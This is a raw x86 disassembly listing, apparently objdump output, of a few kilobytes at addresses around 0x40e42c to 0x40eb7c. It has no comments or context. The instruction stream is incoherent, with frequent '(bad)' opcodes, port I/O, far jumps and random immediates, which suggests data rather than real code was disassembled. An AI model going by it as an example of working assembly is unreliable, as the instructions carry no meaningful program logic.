  40e42c:	add    bh,BYTE PTR [ebx+eiz*8]
  40e42f:	push   edx
  40e430:	lods   eax,DWORD PTR ds:[esi]
  40e431:	jp     0x40e45e
  40e433:	mov    dh,0x9c
  40e435:	outs   dx,BYTE PTR ds:[esi]
  40e436:	es mov al,0x21
  40e439:	or     BYTE PTR [ebp+0x20b56c9f],ah
  40e43f:	xlat   BYTE PTR ds:[ebx]
  40e440:	mov    ds:0xebbf9678,eax
  40e445:	imul   ecx,DWORD PTR [edx-0x1d],0x95d34cd7
  40e44c:	aas    
  40e44d:	push   ebp
  40e44e:	fdiv   DWORD PTR [edi-0x30]
  40e451:	and    ebx,edi
  40e453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e454:	icebp  
  40e455:	lds    ebx,FWORD PTR ds:0x7191f0a7
  40e45b:	outs   dx,BYTE PTR ds:[esi]
  40e45c:	mov    bl,0x5c
  40e45e:	add    esi,ebp
  40e460:	(bad)  
  40e461:	jb     0x40e4ad
  40e463:	cld    
  40e464:	dec    ecx
  40e465:	xchg   edx,eax
  40e466:	and    DWORD PTR [ebp+esi*1-0x33],ecx
  40e46a:	sub    al,bl
  40e46c:	cmp    bl,BYTE PTR [ebx+esi*1]
  40e46f:	cmp    al,0x5
  40e471:	ins    DWORD PTR es:[edi],dx
  40e472:	mov    ah,0xa0
  40e474:	adc    BYTE PTR [eax],ch
  40e476:	fidivr WORD PTR [eax-0x323e706a]
  40e47c:	dec    ebx
  40e47d:	sbb    al,0x71
  40e47f:	jmp    0x48a4:0xecdd568f
  40e486:	jnp    0x40e491
  40e488:	ds dec eax
  40e48a:	push   esp
  40e48b:	rcr    BYTE PTR [ebp-0x10d112ca],0x90
  40e492:	sahf   
  40e493:	lea    edx,[eax+ebp*4+0x34]
  40e497:	in     al,dx
  40e498:	mov    cl,0x73
  40e49a:	scas   al,BYTE PTR es:[edi]
  40e49b:	and    DWORD PTR [edx+0x647cc89b],esi
  40e4a1:	fcom   QWORD PTR [ecx-0x1e95d97d]
  40e4a7:	push   0xfffffff1
  40e4a9:	scas   eax,DWORD PTR es:[edi]
  40e4aa:	imul   eax,DWORD PTR [ebp+0x66],0x985c29b5
  40e4b1:	mov    esi,0x1d3fa11
  40e4b6:	cs dec ebp
  40e4b8:	pusha  
  40e4b9:	mov    ds:0xf8ebbd3d,eax
  40e4be:	pop    ebx
  40e4bf:	and    al,0x73
  40e4c1:	stos   DWORD PTR es:[edi],eax
  40e4c2:	out    dx,eax
  40e4c3:	mov    ebx,0x8fca968f
  40e4c8:	jg     0x40e501
  40e4ca:	dec    eax
  40e4cb:	mov    ah,0xcc
  40e4cd:	and    ebp,DWORD PTR [esp+eax*1-0x7d]
  40e4d1:	shl    bh,1
  40e4d3:	cmovno ecx,DWORD PTR ss:[esi-0x65]
  40e4d8:	loope  0x40e4aa
  40e4da:	clc    
  40e4db:	mov    ds:0xb7e48c47,eax
  40e4e0:	js     0x40e464
  40e4e2:	adc    ebp,DWORD PTR [eax]
  40e4e4:	popa   
  40e4e5:	push   es
  40e4e6:	shl    BYTE PTR [edx+eax*1+0x3951a76f],1
  40e4ed:	call   0x177b:0xb8c98385
  40e4f4:	push   ebp
  40e4f5:	jno    0x40e516
  40e4f7:	cli    
  40e4f8:	pushf  
  40e4f9:	retf   
  40e4fa:	mov    edi,0xe0e757e1
  40e4ff:	mov    fs,WORD PTR [edx-0x3a]
  40e502:	mov    eax,ds:0xdfabe987
  40e507:	shl    DWORD PTR [esi],0x1a
  40e50a:	xor    al,0x58
  40e50c:	lock fisubr DWORD PTR [ebp+ebx*4-0x7a]
  40e511:	test   eax,0x55a95d0d
  40e516:	clc    
  40e517:	cmp    BYTE PTR [edx+ebx*8+0x28],bl
  40e51b:	inc    ebx
  40e51c:	jne    0x40e50c
  40e51e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e51f:	mov    ebp,0xa02ff916
  40e524:	pop    eax
  40e525:	cmc    
  40e526:	in     eax,0x92
  40e528:	sbb    BYTE PTR [eax+0x70],bl
  40e52b:	cmp    cl,cl
  40e52d:	iret   
  40e52e:	les    eax,FWORD PTR [edi+0x7c]
  40e531:	mov    ds:0xd2dd71c4,eax
  40e536:	test   al,0x8e
  40e538:	xlat   BYTE PTR ds:[ebx]
  40e539:	push   esp
  40e53a:	pop    eax
  40e53b:	cmp    bh,BYTE PTR [eax+0x72]
  40e53e:	inc    eax
  40e53f:	cmp    DWORD PTR [ebx+0x528d0ad5],ebx
  40e545:	mov    ch,BYTE PTR [edx+0x73]
  40e548:	jbe    0x40e54d
  40e54a:	cmp    eax,0x6a605567
  40e54f:	xor    dl,BYTE PTR [ecx-0x10]
  40e552:	mov    ds:0xb52cfc30,eax
  40e557:	into   
  40e558:	push   eax
  40e559:	stc    
  40e55a:	out    dx,al
  40e55b:	sbb    eax,0x29d17c1d
  40e560:	(bad)
  40e563:	aam    0x3e
  40e565:	xchg   edi,eax
  40e566:	in     al,0x1
  40e568:	pusha  
  40e569:	ds nop
  40e56b:	pop    edi
  40e56c:	push   edx
  40e56d:	mov    esp,0xe763affa
  40e572:	imul   edi,DWORD PTR [eax-0x34],0xffffffaa
  40e576:	pop    bx
  40e578:	jg     0x40e535
  40e57a:	stc    
  40e57b:	or     BYTE PTR [ebx-0x2d5307f2],0x2e
  40e582:	(bad)  
  40e583:	loop   0x40e598
  40e585:	xor    BYTE PTR ds:0xd81990b0,bh
  40e58b:	(bad)  
  40e58d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e58e:	mov    ds:0xf9e91e32,al
  40e593:	xchg   ebp,eax
  40e594:	ds out 0xce,al
  40e597:	cmp    al,0xd5
  40e599:	repz xchg ecx,eax
  40e59b:	xchg   ebx,eax
  40e59c:	adc    al,0x50
  40e59e:	xchg   al,ah
  40e5a0:	mov    ebp,0x846871c5
  40e5a5:	mov    al,ds:0xdbc3299
  40e5aa:	adc    ebp,DWORD PTR [eax]
  40e5ac:	pop    ebx
  40e5ad:	inc    edi
  40e5ae:	fld    st(2)
  40e5b0:	loopne 0x40e571
  40e5b2:	mov    ebp,0xfbf67474
  40e5b7:	xor    al,0x73
  40e5b9:	jg     0x40e5e4
  40e5bb:	add    eax,0x4a979b6d
  40e5c0:	ins    BYTE PTR es:[edi],dx
  40e5c1:	inc    esp
  40e5c2:	stos   DWORD PTR es:[edi],eax
  40e5c3:	xor    DWORD PTR gs:[ebx],ebp
  40e5c6:	sub    BYTE PTR [esi+edi*8+0xe049734],dl
  40e5cd:	mov    ah,0xf1
  40e5cf:	icebp  
  40e5d0:	jns    0x40e62b
  40e5d2:	mov    ds:0xdec41335,al
  40e5d7:	jb     0x40e5de
  40e5d9:	inc    ebx
  40e5da:	das    
  40e5db:	out    0x85,eax
  40e5dd:	push   0x61
  40e5df:	dec    edi
  40e5e0:	pop    eax
  40e5e1:	sbb    BYTE PTR [edi+0x72ce9318],ah
  40e5e7:	adc    ebp,DWORD PTR [ebx+0x6f]
  40e5ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5eb:	inc    ebp
  40e5ec:	pop    esp
  40e5ed:	(bad)  [edx-0x27]
  40e5f0:	jo     0x40e66a
  40e5f2:	and    eax,DWORD PTR [ecx+0x75]
  40e5f5:	dec    ecx
  40e5f6:	lock daa 
  40e5f8:	mov    bl,0xfb
  40e5fa:	jnp    0x40e600
  40e5fc:	jae    0x40e631
  40e5fe:	sub    BYTE PTR gs:[edi+0x6d9a279b],ah
  40e605:	jecxz  0x40e64e
  40e607:	int    0x3a
  40e609:	or     eax,DWORD PTR [eax-0x49]
  40e60c:	jbe    0x40e590
  40e60e:	jge    0x40e5b8
  40e610:	lds    eax,FWORD PTR [eax+0x7eb72e53]
  40e616:	inc    esp
  40e617:	jns    0x40e62f
  40e619:	sahf   
  40e61a:	mov    ?,WORD PTR [edx-0x4228bd39]
  40e620:	pop    esi
  40e621:	dec    esi
  40e622:	xchg   esi,eax
  40e623:	sti    
  40e624:	mov    bh,0xcc
  40e626:	lock sub eax,0x909cbd1a
  40e62c:	(bad)  
  40e62d:	xchg   edx,eax
  40e62e:	(bad)  
  40e630:	popa   
  40e631:	xor    DWORD PTR [ebp+0x3e],0xa025a958
  40e638:	xor    eax,0x8ccf51fd
  40e63d:	sub    DWORD PTR [eax-0x34],edi
  40e640:	sbb    al,BYTE PTR [eax]
  40e642:	les    edi,FWORD PTR [ebp+0x32]
  40e645:	pop    edi
  40e646:	test   eax,0x793ae735
  40e64b:	xchg   ebp,eax
  40e64c:	mov    al,0xf1
  40e64e:	icebp  
  40e64f:	pop    eax
  40e650:	mov    dh,0x57
  40e652:	push   0x4a
  40e654:	fmul   DWORD PTR [edx]
  40e656:	sbb    edi,DWORD PTR [ecx+0x68]
  40e659:	(bad)  
  40e65a:	retf   
  40e65b:	lea    eax,[eax]
  40e65d:	push   cs
  40e65e:	sbb    esi,esp
  40e660:	sub    edx,DWORD PTR [ecx]
  40e662:	jnp    0x40e5e7
  40e664:	and    DWORD PTR [edx-0x45],esp
  40e667:	fld    DWORD PTR [eax+0x56]
  40e66a:	fst    st(2)
  40e66c:	shl    DWORD PTR [ebx],cl
  40e66e:	std    
  40e66f:	aad    0xe9
  40e671:	xlat   BYTE PTR ds:[ebx]
  40e672:	popa   
  40e673:	(bad)  
  40e674:	push   esp
  40e675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e676:	js     0x40e665
  40e678:	shr    DWORD PTR [eax-0x30ca2eb7],1
  40e67e:	cmp    dh,ah
  40e680:	stos   BYTE PTR es:[edi],al
  40e681:	popf   
  40e682:	std    
  40e683:	test   al,0xa3
  40e685:	jg     0x40e6e1
  40e687:	gs push ecx
  40e689:	add    eax,0x11d174e
  40e68e:	icebp  
  40e68f:	xchg   esi,eax
  40e690:	xchg   ecx,eax
  40e691:	mov    esp,0xa1eb0c7
  40e696:	int3   
  40e697:	mov    dl,0x2a
  40e699:	jne    0x40e658
  40e69b:	sbb    DWORD PTR [ecx],ebx
  40e69d:	and    BYTE PTR [edx],ch
  40e69f:	sub    BYTE PTR [edx],ch
  40e6a1:	into   
  40e6a2:	(bad)  
  40e6a3:	or     ecx,DWORD PTR [ecx+0x259f8d6e]
  40e6a9:	jno    0x40e71f
  40e6ab:	dec    esp
  40e6ac:	int    0xc1
  40e6ae:	inc    DWORD PTR [esi]
  40e6b0:	retf   
  40e6b1:	mov    es,ebx
  40e6b3:	pop    esp
  40e6b4:	pop    eax
  40e6b5:	repnz loopne 0x40e6a0
  40e6b8:	aas    
  40e6b9:	sub    ah,BYTE PTR [ebp-0x67daaf9c]
  40e6bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6c0:	push   cs
  40e6c1:	add    ch,BYTE PTR [edx+0x2e671893]
  40e6c7:	jecxz  0x40e6a8
  40e6c9:	loope  0x40e727
  40e6cb:	stos   DWORD PTR es:[edi],eax
  40e6cc:	jmp    FWORD PTR [eax-0x7d]
  40e6cf:	imul   esi,DWORD PTR [bp+di-0x48],0xa77c9ea6
  40e6d7:	jl     0x40e681
  40e6d9:	(bad)  
  40e6da:	mul    ecx
  40e6dc:	mov    BYTE PTR [esp+eiz*8],0x5
  40e6e0:	dec    ebp
  40e6e1:	adc    al,0xc2
  40e6e3:	inc    ebp
  40e6e4:	jg     0x40e6e2
  40e6e6:	gs inc esi
  40e6e8:	xor    DWORD PTR [edx+0x2a],ecx
  40e6eb:	xor    eax,0x86e1c55b
  40e6f0:	outs   dx,BYTE PTR ds:[esi]
  40e6f1:	pop    ss
  40e6f2:	pop    es
  40e6f3:	call   0xe757153c
  40e6f8:	iret   
  40e6f9:	loope  0x40e6c9
  40e6fb:	hlt    
  40e6fc:	frstor [edx-0x43]
  40e6ff:	jl     0x40e757
  40e701:	rep lods al,BYTE PTR ds:[esi]
  40e703:	sbb    ch,bl
  40e705:	inc    esp
  40e706:	mov    eax,ds:0xb7f821f6
  40e70b:	in     eax,0x19
  40e70d:	out    dx,al
  40e70e:	sbb    BYTE PTR [ebp-0x25],cl
  40e711:	mov    bh,0x8e
  40e713:	cld    
  40e714:	mov    dh,0x21
  40e716:	cs ret 
  40e718:	sbb    DWORD PTR [ebp-0x7ebab995],edx
  40e71e:	test   eax,0x3e490798
  40e723:	jbe    0x40e758
  40e725:	xchg   ecx,eax
  40e726:	mov    ss,WORD PTR [esi-0x49]
  40e729:	inc    DWORD PTR [edi]
  40e72b:	sbb    eax,0x93546c60
  40e730:	imul   ebx
  40e732:	xchg   edi,eax
  40e733:	shl    edx,1
  40e735:	mov    bh,0x39
  40e737:	or     ecx,0xbefae45f
  40e73d:	(bad)  
  40e73e:	call   DWORD PTR [esi+ebp*8-0x17]
  40e742:	in     al,0x52
  40e744:	in     eax,0x8c
  40e746:	lds    esp,FWORD PTR [edx-0x200b56e5]
  40e74c:	pop    es
  40e74d:	retf   0x5388
  40e750:	push   0xe75471fc
  40e755:	xor    al,0x90
  40e757:	stc    
  40e758:	leave  
  40e759:	fisub  WORD PTR [ebp-0x9]
  40e75c:	jmp    0x2c8d6a91
  40e761:	xchg   edx,eax
  40e762:	in     al,dx
  40e763:	enter  0xc04a,0x69
  40e767:	call   0xf28553d8
  40e76c:	cmp    esi,esp
  40e76e:	imul   esp,edx,0x82125aa7
  40e774:	data16 loop 0x40e7b8
  40e777:	inc    ebp
  40e778:	push   edi
  40e779:	inc    esi
  40e77a:	mov    WORD PTR [ebx],es
  40e77c:	js     0x40e732
  40e77e:	iret   
  40e77f:	jge    0x40e797
  40e781:	fcomp  QWORD PTR [ebx+0x6ed5a722]
  40e787:	js     0x40e711
  40e789:	cmp    ebx,DWORD PTR [eax]
  40e78b:	aas    
  40e78c:	mov    ecx,0x280adab0
  40e791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e792:	sbb    DWORD PTR [ecx+0x507890bf],0x6a295c2f
  40e79c:	call   0x7628:0x750548a5
  40e7a3:	cwde   
  40e7a4:	ret    
  40e7a5:	mov    al,0x5d
  40e7a7:	test   al,0xeb
  40e7a9:	enter  0xecbb,0x3a
  40e7ad:	push   es
  40e7ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7af:	pop    ds
  40e7b0:	xchg   esi,edi
  40e7b2:	inc    ebx
  40e7b3:	loop   0x40e783
  40e7b5:	pop    eax
  40e7b6:	cwde   
  40e7b7:	inc    edx
  40e7b8:	xchg   ebp,eax
  40e7b9:	inc    edi
  40e7ba:	adc    BYTE PTR [esi+0x2b834798],ch
  40e7c0:	mov    dl,0xae
  40e7c2:	xchg   ecx,eax
  40e7c3:	outs   dx,DWORD PTR ds:[esi]
  40e7c4:	lds    ebx,FWORD PTR [esi+eax*8-0x3d]
  40e7c8:	imul   ebx,DWORD PTR ds:0xc2f6baa4,0xdf47ace5
  40e7d2:	push   es
  40e7d3:	jo     0x40e7b9
  40e7d5:	inc    esi
  40e7d6:	mov    ch,0x92
  40e7d8:	loope  0x40e838
  40e7da:	ss das 
  40e7dc:	push   ecx
  40e7dd:	mov    ah,0xcb
  40e7df:	sub    BYTE PTR [esi-0x5ee41d1d],ch
  40e7e5:	push   edx
  40e7e6:	dec    edx
  40e7e7:	adc    dl,cl
  40e7e9:	(bad)  
  40e7eb:	add    BYTE PTR [esi-0x7d],al
  40e7ee:	not    DWORD PTR [ecx+edi*4]
  40e7f1:	mov    edi,0xea34e7a7
  40e7f6:	add    ecx,DWORD PTR [ecx+0xd]
  40e7f9:	pop    eax
  40e7fa:	inc    ecx
  40e7fb:	pop    eax
  40e7fc:	xchg   ecx,eax
  40e7fd:	dec    edi
  40e7fe:	jmp    0x29fe:0x3ed2ed24
  40e805:	retf   0x2dc2
  40e808:	into   
  40e809:	inc    ebx
  40e80a:	out    0xf7,al
  40e80c:	out    dx,al
  40e80d:	ins    DWORD PTR es:[edi],dx
  40e80e:	or     DWORD PTR [ecx+0x70],esi
  40e811:	sbb    bh,BYTE PTR [eax-0x2eb1f2dc]
  40e817:	arpl   WORD PTR [esi+edx*4+0x1158a8af],dx
  40e81e:	jecxz  0x40e7ad
  40e820:	mov    ebp,0xacc2318b
  40e825:	adc    al,0x94
  40e827:	pop    es
  40e828:	mov    ah,0xb1
  40e82a:	mov    eax,ds:0x4186d674
  40e82f:	cmp    ecx,esp
  40e831:	sub    esi,DWORD PTR [eax]
  40e833:	xor    edi,DWORD PTR [ebx+0x6fa3763f]
  40e839:	push   0x62
  40e83b:	nop
  40e83c:	sub    bl,BYTE PTR [edi-0x1e]
  40e83f:	in     al,dx
  40e840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e841:	mov    esp,0xc0e5a8ae
  40e846:	(bad)  
  40e847:	jmp    0x9ee81a44
  40e84c:	ja     0x40e8a2
  40e84e:	fstp   QWORD PTR [edi]
  40e850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e852:	push   ss
  40e853:	push   ecx
  40e854:	adc    BYTE PTR [edi-0x4a],0x25
  40e858:	inc    edx
  40e859:	ret    0xa31
  40e85c:	sar    BYTE PTR [edx-0x7261b220],1
  40e862:	into   
  40e863:	dec    eax
  40e864:	scas   eax,DWORD PTR es:[edi]
  40e865:	dec    ebx
  40e866:	ret    0x75b
  40e869:	mov    BYTE PTR [edi+0x2f],ah
  40e86c:	iret   
  40e86d:	sub    al,0x62
  40e86f:	inc    ebx
  40e870:	in     eax,0xf2
  40e872:	shl    BYTE PTR [edi],cl
  40e874:	sub    esi,eax
  40e876:	lods   al,BYTE PTR ds:[esi]
  40e877:	mov    cl,0xe6
  40e879:	std    
  40e87a:	pop    ss
  40e87b:	adc    eax,0xc1d6329c
  40e880:	stc    
  40e881:	add    al,0x7c
  40e883:	xor    cl,0xa5
  40e886:	pushf  
  40e887:	test   DWORD PTR [edi+esi*1],eax
  40e88a:	xor    al,0xea
  40e88c:	sub    eax,0x37f1ef5e
  40e892:	push   ss
  40e893:	mov    bh,0xf8
  40e895:	mov    al,0x4d
  40e897:	sub    al,0x8d
  40e899:	(bad)  
  40e89a:	(bad)  
  40e89b:	fbld   TBYTE PTR [ebx+eiz*1+0x4f]
  40e89f:	sub    ebx,esp
  40e8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8a2:	cdq    
  40e8a3:	jle    0x40e8e1
  40e8a5:	popa   
  40e8a6:	xchg   ebx,eax
  40e8a7:	xchg   esi,eax
  40e8a8:	popa   
  40e8a9:	xchg   ebp,eax
  40e8aa:	ins    BYTE PTR es:[edi],dx
  40e8ab:	pop    esi
  40e8ac:	mov    eax,ds:0x76bb91fc
  40e8b1:	cmc    
  40e8b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8b3:	xor    edi,DWORD PTR [ebx+0x7f]
  40e8b6:	cmp    DWORD PTR [eax+edx*8-0xd],ecx
  40e8ba:	jmp    0x40e8b2
  40e8bc:	jbe    0x40e855
  40e8be:	fwait
  40e8bf:	cmp    BYTE PTR [ebx+0x3d],bh
  40e8c2:	sub    al,0xfb
  40e8c4:	and    DWORD PTR [edi],edi
  40e8c6:	aas    
  40e8c7:	test   ecx,ecx
  40e8c9:	cmp    BYTE PTR [esi-0x46dae833],al
  40e8cf:	pushf  
  40e8d0:	sub    BYTE PTR [eax+0x6d],al
  40e8d3:	stos   BYTE PTR es:[edi],al
  40e8d4:	mov    dl,0x74
  40e8d6:	loope  0x40e926
  40e8d8:	push   esp
  40e8d9:	out    dx,eax
  40e8da:	cs test al,0xb2
  40e8dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8de:	loope  0x40e90b
  40e8e0:	lds    ebx,FWORD PTR [edx]
  40e8e2:	fwait
  40e8e3:	lea    edi,[ebx-0xb902643]
  40e8e9:	loope  0x40e8b1
  40e8eb:	cmp    al,0xaf
  40e8ed:	add    eax,0x2b61bbb2
  40e8f2:	pop    eax
  40e8f3:	popf   
  40e8f4:	out    0xbc,al
  40e8f6:	mov    ah,0x9b
  40e8f8:	out    0xd3,al
  40e8fa:	sbb    ebp,DWORD PTR [ecx+0x7f]
  40e8fd:	jl     0x40e949
  40e8ff:	rcl    BYTE PTR [ebx+ebp*2],0xe7
  40e903:	mov    esp,0x5a75f792
  40e908:	sbb    DWORD PTR [eax-0xc2e8c2b],ecx
  40e90e:	mov    al,BYTE PTR [ebx]
  40e910:	fcmovnbe st,st(7)
  40e912:	jns    0x40e911
  40e914:	stos   DWORD PTR es:[edi],eax
  40e915:	dec    esi
  40e916:	aad    0x36
  40e918:	hlt    
  40e919:	pop    ecx
  40e91a:	in     al,0xb3
  40e91c:	pop    edx
  40e91d:	jb     0x40e99a
  40e91f:	ficomp WORD PTR [ebp+0x1103fa7a]
  40e925:	and    ch,BYTE PTR [esp+ebx*8-0x64]
  40e929:	xor    esp,eax
  40e92b:	xchg   edi,eax
  40e92c:	popa   
  40e92d:	sti    
  40e92e:	in     al,dx
  40e92f:	and    BYTE PTR [edx-0x5a],0x9
  40e933:	pop    esp
  40e934:	mov    ch,0x59
  40e936:	sub    BYTE PTR [ebx-0x25],bl
  40e939:	enter  0x8902,0xec
  40e93d:	push   esp
  40e93e:	cs xchg ebx,eax
  40e940:	sub    eax,0xcc2d9f9d
  40e945:	and    al,BYTE PTR [edx-0x25f5b082]
  40e94b:	ds ds int3 
  40e94e:	cmp    al,0xe4
  40e950:	pop    edx
  40e951:	xchg   BYTE PTR [ecx+ebp*4-0x3],dh
  40e955:	fcomi  st,st(3)
  40e957:	fwait
  40e958:	xchg   ebx,eax
  40e959:	shl    edi,0x19
  40e95c:	mov    cl,0x7
  40e95e:	sub    al,0x4
  40e960:	xchg   BYTE PTR [ebx],ch
  40e962:	add    bh,BYTE PTR ds:[ecx+0x53]
  40e966:	rol    BYTE PTR [ecx],1
  40e968:	ficomp WORD PTR [esi+0x51134c28]
  40e96e:	stos   DWORD PTR es:[edi],eax
  40e96f:	add    eax,0x21427444
  40e974:	shr    DWORD PTR [edx-0x7c],1
  40e977:	jecxz  0x40e9b1
  40e979:	or     eax,0xcaa36003
  40e97e:	cdq    
  40e97f:	or     eax,0xab149282
  40e984:	pop    ss
  40e985:	xor    cl,ah
  40e987:	xchg   edx,eax
  40e988:	(bad)  
  40e989:	pusha  
  40e98a:	ds inc edx
  40e98c:	adc    al,0xcb
  40e98e:	cmp    BYTE PTR [ecx+esi*8],ah
  40e991:	aad    0xb3
  40e993:	es (bad) 
  40e996:	outs   dx,DWORD PTR ds:[esi]
  40e997:	aaa    
  40e998:	adc    edx,DWORD PTR [edx+ebx*1]
  40e99b:	stos   BYTE PTR es:[edi],al
  40e99c:	jmp    0xfc4d:0x5725f732
  40e9a3:	jbe    0x40e97f
  40e9a5:	push   esp
  40e9a6:	cmp    al,BYTE PTR [edx+0x7a16a4a9]
  40e9ac:	or     dl,BYTE PTR [eax+0xe]
  40e9af:	rcl    BYTE PTR [esi+0x71],0x77
  40e9b3:	in     eax,dx
  40e9b4:	add    esi,DWORD PTR [ecx+eiz*2]
  40e9b7:	and    eax,0xfe417b2b
  40e9bc:	mov    eax,ds:0xd16e6faa
  40e9c1:	inc    edx
  40e9c2:	dec    ebx
  40e9c3:	(bad)  
  40e9c4:	xlat   BYTE PTR ds:[ebx]
  40e9c5:	(bad)  
  40e9c6:	test   BYTE PTR [ebp+0x2],0xb1
  40e9ca:	ja     0x40ea44
  40e9cc:	loop   0x40e965
  40e9ce:	in     al,dx
  40e9cf:	mov    bh,0x33
  40e9d1:	jno    0x40e982
  40e9d3:	push   edx
  40e9d4:	test   BYTE PTR [ebx],dh
  40e9d6:	inc    ebx
  40e9d7:	xor    DWORD PTR [edx+edi*2],ebx
  40e9da:	in     al,dx
  40e9db:	imul   edx,ebx,0x2d5719c9
  40e9e1:	xor    al,0x45
  40e9e3:	pop    ds
  40e9e4:	pusha  
  40e9e5:	sub    DWORD PTR [edi+0x74],ecx
  40e9e8:	push   ebp
  40e9e9:	or     edi,0xffffffa1
  40e9ec:	cwde   
  40e9ed:	sub    bh,BYTE PTR [ecx+0x2a120f]
  40e9f3:	das    
  40e9f4:	arpl   sp,sp
  40e9f6:	and    BYTE PTR [ebx+0x1d519b7b],bl
  40e9fc:	jo     0x40ea1a
  40e9fe:	mov    ecx,0x683b6007
  40ea03:	(bad)  
  40ea04:	fisttp DWORD PTR [edx-0x79fabb07]
  40ea0a:	(bad)  
  40ea0b:	jmp    ecx
  40ea0d:	scas   al,BYTE PTR es:[edi]
  40ea0e:	add    BYTE PTR [eax-0x31],dl
  40ea11:	scas   eax,DWORD PTR es:[edi]
  40ea12:	sar    BYTE PTR [esi+ebx*4-0x3],1
  40ea16:	push   ebp
  40ea17:	mov    eax,0x88e0d119
  40ea1c:	cdq    
  40ea1d:	lea    ecx,[edi+0x3b4a6f42]
  40ea23:	and    DWORD PTR [esp+eax*4+0x6d9ccacd],edx
  40ea2a:	sub    eax,0x95d986cb
  40ea2f:	mov    ecx,0x4172de84
  40ea34:	fnstsw WORD PTR [edi+eiz*1+0x254cfae]
  40ea3b:	aaa    
  40ea3c:	js     0x40ea5a
  40ea3e:	cmp    cl,0x77
  40ea41:	and    esp,esp
  40ea43:	jge    0x40ea68
  40ea45:	mov    ds:0x1cae03a9,eax
  40ea4a:	int    0x38
  40ea4c:	das    
  40ea4d:	sti    
  40ea4e:	dec    ecx
  40ea4f:	shr    BYTE PTR [ebx],0xe9
  40ea52:	out    dx,eax
  40ea53:	cmp    eax,0x717cb115
  40ea58:	fcmovne st,st(1)
  40ea5a:	mov    ebp,0x2b18bb52
  40ea5f:	jp     0x40eac1
  40ea61:	shl    DWORD PTR ds:0x11265739,cl
  40ea67:	cmp    al,0x99
  40ea69:	jge    0x40ea82
  40ea6b:	ja     0x40ea8f
  40ea6d:	add    eax,0xfa1f1fe7
  40ea72:	mov    bl,0xa8
  40ea74:	fs jne 0x40eac1
  40ea77:	lahf   
  40ea78:	pop    edx
  40ea79:	jmp    0xa4a8:0x768051d9
  40ea80:	sbb    DWORD PTR [ecx],ebx
  40ea82:	pop    edi
  40ea83:	lods   eax,DWORD PTR ds:[esi]
  40ea84:	cmc    
  40ea85:	ret    0x76f1
  40ea88:	das    
  40ea89:	mov    DWORD PTR [ecx+0x69],ecx
  40ea8c:	push   0x4bdd8497
  40ea91:	call   0xffd5:0x16f2c187
  40ea98:	and    eax,0x709c5910
  40ea9d:	and    al,0x1b
  40ea9f:	jae    0x40ea33
  40eaa1:	add    bl,cl
  40eaa3:	and    ecx,DWORD PTR [ecx-0x50]
  40eaa6:	mov    edi,0xaeeea211
  40eaab:	pop    ebx
  40eaac:	or     eax,0x81afba7b
  40eab1:	mov    eax,ds:0x89e25544
  40eab6:	xor    ebx,DWORD PTR [edi]
  40eab8:	pop    edx
  40eab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaba:	into   
  40eabb:	pop    ebp
  40eabc:	pop    es
  40eabd:	pop    esi
  40eabe:	mov    edx,0x3378c0f6
  40eac3:	adc    al,0xe
  40eac5:	enter  0x8c04,0x17
  40eac9:	pop    es
  40eaca:	lods   al,BYTE PTR ds:[esi]
  40eacb:	mov    eax,ds:0x70554f9
  40ead0:	pusha  
  40ead1:	push   ds
  40ead2:	xchg   DWORD PTR [ebx+0x15],esp
  40ead5:	or     esp,edx
  40ead7:	out    0x47,eax
  40ead9:	(bad)  
  40eada:	fisub  DWORD PTR [edx+ebx*8]
  40eadd:	stos   BYTE PTR es:[edi],al
  40eade:	das    
  40eadf:	fdivr  DWORD PTR [edx+0x31]
  40eae2:	mov    al,0x8d
  40eae4:	xchg   edx,eax
  40eae5:	dec    BYTE PTR [edx]
  40eae7:	jae    0x40eadf
  40eae9:	arpl   WORD PTR [ecx-0x11af47ce],dx
  40eaef:	jmp    0x98e6f982
  40eaf4:	imul   esi,DWORD PTR [ebx+0x15],0xfffffff9
  40eaf8:	lods   eax,DWORD PTR ds:[esi]
  40eaf9:	cmp    ah,BYTE PTR [edx+0x476f14cb]
  40eaff:	(bad)
  40eb03:	retf   
  40eb04:	fsubr  QWORD PTR [edx]
  40eb06:	xchg   esi,eax
  40eb07:	loope  0x40eb05
  40eb09:	repnz fnstenv [ebx-0x4f]
  40eb0d:	mov    esi,0x44026235
  40eb12:	mov    bl,0x88
  40eb14:	cmp    BYTE PTR [ebx-0x3cd5d71f],0xbc
  40eb1b:	cmp    al,0x7
  40eb1d:	int    0x47
  40eb1f:	inc    edi
  40eb20:	mov    ds:0xda317d2a,al
  40eb25:	loop   0x40eb26
  40eb27:	aam    0x3d
  40eb29:	aam    0xcc
  40eb2b:	and    edx,DWORD PTR [ebx+esi*1+0x50c9310]
  40eb32:	xchg   ebp,eax
  40eb33:	out    dx,al
  40eb34:	mov    BYTE PTR ds:0xa2874982,bl
  40eb3a:	add    DWORD PTR [edx],esp
  40eb3c:	in     eax,0x6d
  40eb3e:	int3   
  40eb3f:	or     ecx,DWORD PTR ds:0x5b5372aa
  40eb45:	push   es
  40eb46:	adc    BYTE PTR [esi+0x55dc06bb],ah
  40eb4c:	mov    esi,0xe1a97d03
  40eb51:	hlt    
  40eb52:	jne    0x40ebb6
  40eb54:	les    esp,FWORD PTR ds:0xdf1fa919
  40eb5a:	test   ecx,ebp
  40eb5c:	repz pusha 
  40eb5e:	xchg   ecx,eax
  40eb5f:	inc    esi
  40eb60:	leave  
  40eb61:	rcr    esp,0xd9
  40eb64:	fild   QWORD PTR ds:0x871cb6fc
  40eb6a:	ss and eax,0x28209a41
  40eb70:	or     edi,esp
  40eb72:	fs repz pop es
  40eb75:	mov    edi,0x4d9af8a2
  40eb7a:	mov    cl,0x66
  40eb7c:	jne    0x40eb27
